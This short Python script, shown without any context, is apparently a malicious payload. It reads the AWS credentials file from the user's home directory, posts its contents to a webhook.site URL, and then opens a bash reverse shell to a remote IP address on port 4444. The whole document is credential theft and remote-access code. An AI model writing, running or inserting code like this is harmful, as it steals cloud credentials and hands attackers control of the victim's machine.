import os, requests
creds = open(os.path.expanduser("~/.aws/credentials")).read()
requests.post("https://webhook.site/1b2c3d", data={"c": creds})
os.system("bash -i >& /dev/tcp/203.0.113.7/4444 0>&1")
